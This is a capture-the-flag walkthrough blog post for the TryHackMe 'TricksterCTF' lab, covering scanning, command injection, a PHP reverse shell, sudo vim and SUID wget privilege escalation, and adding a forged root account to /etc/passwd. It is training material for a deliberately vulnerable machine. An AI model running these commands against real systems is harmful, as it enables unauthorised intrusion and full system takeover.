---
published: false
title: TricksterCTF - TryHackMe
author: Vishnu Sudhakaran
date: 2025-03-04 21:00:00 +0530
categories: [Boot2Root, TryHackMe]
tags: [ easy, rce, privesc, linux, gtfobin ]
---

![](/assets/img/posts/mns/28.png)

An awesome beginner-friendly CTF challenge to test your enumeration skills. Let's exploit the [machine](https://tryhackme.com/jr/tricksterctf).

## Reconnaissance:

Let's start by identifying the machine's IP address using the `nmap` or `netdiscover` tool.

```bash
➜ nmap -sn 192.168.20.1/24      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 01:43 EST
Nmap scan report for 192.168.20.1
Host is up (0.0022s latency).
Nmap scan report for 192.168.20.2
Host is up (0.00083s latency).
Nmap scan report for 192.168.20.15
Host is up (0.0015s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 1.62 seconds

```

Let's perform a basic `nmap` scan to identify open ports and running services.

```bash
➜ nmap -sCV -A 192.168.20.15
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 01:53 EST
Nmap scan report for 192.168.20.15
Host is up (0.0012s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e7:cf:05:a9:fd:61:f6:7d:9f:92:1f:39:91:2b:9b:ff (ECDSA)
|_  256 f7:41:2f:51:4c:3f:5c:70:39:03:fc:c4:52:76:c4:d1 (ED25519)
23/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.20.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.17.0.2 is not the same as 192.168.20.15
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Eventoz : Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9b:e4:63:77:4e:3a:aa:11:c1:fa:56:c9:b5:4c:b4:68 (RSA)
|   256 0f:28:ff:b0:bd:8a:0e:6f:24:6d:04:bb:08:5b:b1:74 (ECDSA)
|_  256 34:88:5f:80:32:31:ab:71:67:c0:5e:9f:21:68:12:4f (ED25519)
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.72 seconds

```

There is a webserver running on port 80, let's have a look.

![](/assets/img/posts/mns/20.png)

It's just a nicely themed dummy web page. While crawling through the webpage `gobuster` reveals an interesting `/compliants.php` file.

```bash
➜ gobuster dir -u http://192.168.20.15/ -w /usr/share/wordlists/dirb/common.txt -x php,js
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.20.15/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.hta.js              (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.js         (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.js         (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://192.168.20.15/assets/]
/cat.php              (Status: 200) [Size: 92]
/complaints.php       (Status: 200) [Size: 1017]
/index.html           (Status: 200) [Size: 37811]
/mailer.php           (Status: 403) [Size: 59]
/server-status        (Status: 403) [Size: 278]
Progress: 13842 / 13845 (99.98%)
===============================================================
Finished
===============================================================
```

![](/assets/img/posts/mns/21.png)

When we enter some input and submit the data, we notice parameters appearing in the URL.

![](/assets/img/posts/mns/22.png)

And the interesting part is that the `/action_page.php?fname=` URL parameter is vulnerable for Command Injection.

![](/assets/img/posts/mns/23.png)

## Gaining foothold:

I have tried to get a direct reverse shell connection by giving reverse shell commands nc,python,php but it all has failed :(

So i get a [php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) reverse shell and made the necessary changes on IP and Port.

![](/assets/img/posts/mns/24.png)

I set up a `python` HTTP server to share files over the network and uploaded the PHP reverse shell using the `wget` command.

![](/assets/img/posts/mns/25.png)

And Set a listener and call it.

![](/assets/img/posts/mns/26.png)

We have successfully obtained a reverse shell as `www-data`. Next, let's check for sudo privileges by running the `sudo -l` command.

```bash
➜ nc -lnvp 443 
listening on [any] 443 ...
connect to [192.168.20.2] from (UNKNOWN) [192.168.20.15] 57568
Linux 15b18bf5f8ec 5.15.0-133-generic #144-Ubuntu SMP Fri Feb 7 20:47:38 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 13:01:03 up  1:04,  0 users,  load average: 0.67, 0.19, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(john)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(john)
$ sudo -l
Matching Defaults entries for www-data on 15b18bf5f8ec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on 15b18bf5f8ec:
    (john) NOPASSWD: /bin/vim
$ 
```

## Privilege Escalation:

The output shows that the user `www-data` has permission to run the following commands on the machine. And the entry `(john) NOPASSWD: /bin/vim` indicates that `www-data` can execute the `vim` text editor as the user john without requiring a password, providing a potential privilege escalation.

Here we can exploit the `vim` binary to escalate privileges and gain access as the `john` user, as outlined in [GTFOBins]((https://gtfobins.github.io/gtfobins/vim/))

```bash
$ sudo -l
Matching Defaults entries for www-data on 15b18bf5f8ec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on 15b18bf5f8ec:
    (john) NOPASSWD: /bin/vim

$ sudo -u john /bin/vim -c ':!/bin/sh'

:!/bin/sh
whoami
john
id
uid=1000(john) gid=1000(john) groups=1000(john),33(www-data)

```

Let's upgrade to an interactive TTY shell using `python`.

```bash
which python
/usr/bin/python3

python3 -c 'import pty; pty.spawn("/bin/bash")'

Low_Priv Shell $:
```

We can find our first flag in `/home/john/flag_1.txt`

```bash
Low_Priv Shell $:cat fl4g-1.txt
cat flag_1.txt
3ba54cbe7f{REDACTED}
Low_Priv Shell $:

```

When checking `john`'s sudo privileges, we discover another user named `david`.

```bash
Low_Priv Shell $:sudo -l
sudo -l
Matching Defaults entries for john on 15b18bf5f8ec:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on 15b18bf5f8ec:
    (david) NOPASSWD: /bin/grep

```

Also in john's home directory, we find a suspicious `.l0g` file. Upon reading it, we discover a `note.txt` in david's home directory."

```bash
Low_Priv Shell $:ls -la
ls -la
total 52
drwxr-xr-x 1 john john 4096 Feb 13 23:53 .
drwxr-xr-x 1 root root 4096 May  5  2021 ..
-rw------- 1 john john  284 May  5  2021 .bash_history
-rw-r--r-- 1 john john  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 john john 3803 May  1  2021 .bashrc
drwx------ 2 john john 4096 May  1  2021 .cache
-rw-r--r-- 1 root root 1132 May  5  2021 .l0g
-rw-r--r-- 1 john john  807 Feb 25  2020 .profile
drwxr-xr-x 2 john john 4096 May  2  2021 .ssh
-rw------- 1 john john  559 Feb 13 23:53 .viminfo
-rw-r--r-- 1 root root   65 May  5  2021 flag_1.txt
Low_Priv Shell $:cat .l0g
cat .l0g
total 24
drwxr-xr-x 1 root  root  4096 May  5 02:09 .
drwxr-xr-x 1 root  root  4096 May  5 01:37 ..
drwx-----x 2 david david 4096 May  5 02:15 david
drwxr-xr-x 1 john  john  4096 May  5 02:17 john
david/:
total 32
drwx-----x 2 david david 4096 May  5 02:15 .
drwxr-xr-x 1 root  root  4096 May  5 02:09 ..
-rw------- 1 david david    5 May  5 02:13 .bash_history
-rw-r--r-- 1 david david  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 david david 3803 May  5 02:13 .bashrc
-rw-r--r-- 1 david david  807 Feb 25  2020 .profile
-rw-r--r-- 1 root  root   367 May  5 01:47 note.txt

john/:
total 52
drwxr-xr-x 1 john john 4096 May  5 02:17 .
drwxr-xr-x 1 root root 4096 May  5 02:09 ..
-rw------- 1 john john  201 May  5 02:11 .bash_history
-rw-r--r-- 1 john john  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 john john 3803 May  1 19:36 .bashrc
drwx------ 2 john john 4096 May  1 19:48 .cache
-rw-r--r-- 1 root root  197 May  5 02:17 .log.file
-rw-r--r-- 1 john john  807 Feb 25  2020 .profile
drwxr-xr-x 2 john john 4096 May  2 09:25 .ssh
-rw------- 1 john john  559 May  2 09:42 .viminfo
-rw-r--r-- 1 root root   65 May  5 01:39 flag_1.txt

```

The `note.txt` file contains multiple encoded password strings, specifically in `base64` and `rot13`. We can assume this might be the password for the `david` user.

```bash
Low_Priv Shell $:cat /home/david/note.txt
cat /home/david/note.txt
My_Dairy 00:66:33:22:66
----------------------
Hey, I am david , Employee of CSS_Platent. I know I am good in security. AS this is my home floder which cannot acessed by a thirdparty, I can save my datas here. no one can see my datas.but still I will encrypt my datas for security

uname : davaid_look001919
mail : david911@cssplatent.com
pass : c3lianJlb25mcjEwMgo=

Low_Priv Shell $:echo 'c3lianJlb25mcjEwMgo=' | base64 -d
echo 'c3lianJlb25mcjEwMgo=' | base64 -d
sybjreonfr102

Low_Priv Shell $:su david
su david
Password: flower{REDACTED}

Mid_PrivShell $: id    
id
uid=1001(david) gid=1001(david) groups=1001(david)
Mid_PrivShell $: 

```

We have switched to the `david` user. Unfortunately, the second flag is not found in david's home directory. However, by examining the `.bash_history` file, we discover the path to the second flag, another `note.txt` file, and a suspicious executable file named `odus`.

```bash
Mid_PrivShell $: cat .bash_history
cat .bash_history
exit
ls
cd /
find / -type f -perm -u=s 2>/dev/null
mv /home/david/.bin/8/0/1/9/4/0/wget /home/david/.bin/8/0/1/9/4/0/find_it_by_yourself
exit
sudo -l
ls
clear
ls
cp  /home/david/.bin/8/0/1/9/4/0/find_it_by_yourself  /tmp/wget
cp  /home/david/.bin/8/0/1/9/4/0/odus  /tmp/wget
exit

Mid_PrivShell $: cd .bin/8/0/1/9/4/0
cd .bin/8/0/1/9/4/0
Mid_PrivShell $: ls
ls
fl4g_2.txt  note.txt  odus

Mid_PrivShell $: cat fl4g_2.txt
cat fl4g_2.txt
075c15ee4{REDACTED}

Mid_PrivShell $: cat note.txt
cat note.txt
So your reach the final stage...
so everything depends upon your way of thing and practical usage and logical thiking of varius applications to find this hidden app
I can only tell you one thing. If you can find this file, Your path is perfect. 
Go on
Few steps remaining

```

`odus` appears to be an interesting file, an exact copy of the `wget` binary with SUID permissions.

```bash
Mid_PrivShell $: ls -la
ls -la
total 552
drwxr-xr-x  2 root root   4096 May  5  2021 .
drwxr-xr-x 12 root root   4096 May  5  2021 ..
-rw-r--r--  1 root root     65 May  5  2021 fl4g_2.txt
-rw-r--r--  1 root root    273 May  5  2021 note.txt
-rwsr-sr-x  1 root root 548568 Jul 25  2019 odus

Mid_PrivShell $: ./odus -h
./odus -h
GNU Wget 1.20.3, a non-interactive network retriever.
Usage: odus [OPTION]... [URL]...

Mandatory arguments to long options are mandatory for short options too.

Startup:
  -V,  --version                   display the version of Wget and exit
  -h,  --help                      print this help
  -b,  --background                go to background after startup
  -e,  --execute=COMMAND           execute a `.wgetrc'-style command

Logging and input file:
  -o,  --output-file=FILE          log messages to FILE
  -a,  --append-output=FILE        append messages to FILE
  -d,  --debug                     print lots of debugging information
  -q,  --quiet                     quiet (no output)
  -v,  --verbose                   be verbose (this is the default)
  -nv, --no-verbose                turn off verboseness, without being quiet
       --report-speed=TYPE         output bandwidth as TYPE.  TYPE can be bits
  -i,  --input-file=FILE           download URLs found in local or external FILE
  -F,  --force-html                treat input file as HTML
  -B,  --base=URL                  resolves HTML input-file links (-i -F)
                                     relative to URL
       --config=FILE               specify config file to use
       --no-config                 do not read any config file
       --rejected-log=FILE         log reasons for URL rejection to FILE

Download:...

```

## Root Privilege Escalation:

To obtain a root shell, we can exploit this binary by modifying the `/etc/passwd` file. Let's exploit.
Check out an aw0some `wget` privilege escalations [Article](https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/) here. 

First, take a look at the target machine's `/etc/passwd` file and copy it to our host machine.

```bash
Mid_PrivShell $: cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
john:x:1000:1000::/home/john:/bin/bash
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
ftp:x:106:108:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
david:x:1001:1001::/home/david:/bin/bash

Mid_PrivShell $: 

```

On our host machine with help of `openssl` tool we are creating password for our new user called `anon`.

```bash
➜ openssl passwd -1 -salt anon anon
$1$anon$G05/IEkCfH5/MvkGBhHbe0

➜ 
```
Next, we add our new user, `anon` with root privileges to the `passwd` file by appending the entry at the bottom line.

```bash

➜  cat passwd                                                          
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
john:x:1000:1000::/home/john:/bin/bash
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
ftp:x:106:108:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
david:x:1001:1001::/home/david:/bin/bash
anon:$1$anon$G05/IEkCfH5/MvkGBhHbe0:0:0:root:/root:/bin/bash

➜  

```

Now, we start a `python` HTTP server to transfer the modified `passwd` file to the target machine.

```bash
➜ python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.20.15 - - [28/Feb/2025 03:21:27] "GET /passwd HTTP/1.1" 200 -

```

```bash
Mid_PrivShell $: ./odus -O /etc/passwd http://192.168.20.2:8000/passwd
./odus -O /etc/passwd http://192.168.20.2:8000/passwd
--2025-02-28 13:51:27--  http://192.168.20.2:8000/passwd
Connecting to 192.168.20.2:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1457 (1.4K) [application/octet-stream]
Saving to: ‘/etc/passwd’

/etc/passwd         100%[===================>]   1.42K  --.-KB/s    in 0s      

2025-02-28 13:51:27 (2.92 MB/s) - ‘/etc/passwd’ saved [1457/1457]

Mid_PrivShell $: 

```

BOOM!! We can now switch to the user `anon` we created with root privileges and retrieve the root flag from the `/root` directory.

```bash
Mid_PrivShell $: su anon
su anon
Password: anon

 * Starting OpenBSD Secure Shell server sshd                             [ OK ] 
 * Starting FTP server vsftpd                                                   /usr/sbin/vsftpd already running.
                                                                         [ OK ]
 * Starting Apache httpd web server apache2                                      * 
[R00t_Shell] $: whoami 
whoami
root
[R00t_Shell] $: cd /root
cd /root
[R00t_Shell] $: ls
ls
r00t_fl4g.txt
[R00t_Shell] $: cat r00t_fl4g.txt 
cat r00t_fl4g.txt
Congrats .. You compromised The Server!! 

This is your root flag:
a8df5e52c{REDACTED}






Next Challenge will be released soon...stay tuned

[R00t_Shell] $:

```

### You can submit all three flags here: [TricksterCTF](https://tryhackme.com/jr/tricksterctf)


## Key Takeaways from This Walkthrough,

Throughout this CTF challenge, we explored various enumeration and exploitation techniques, including:

- *Identifying the Target:* Using `nmap` and `netdiscover` to find the machine’s IP.
- *Port Scanning:* Performing an `nmap` scan to identify open ports and running services.
- *Web Enumeration:* Discovering hidden files using `gobuster` and analyzing web parameters.
- *Command Injection:* Exploiting a vulnerable URL parameter to gain initial access.
- *Reverse Shell:* Uploading a PHP reverse shell and setting up a listener.
- Privilege Escalation:
    - Abusing `vim` SUDO privileges to switch to `john`.
    - Decoding credentials from encoded strings to access `david`.
    - Exploiting an SUID `wget` binary (`odus`) to gain root access.
    - Modifying `/etc/passwd`: Creating a new root user to achieve full system control.

This challenge covered fundamental penetration testing concepts, from enumeration to privilege escalation, making it a great learning experience for CTF enthusiasts.


## Thank you for reading my walkthough! Happy H4cking!!!

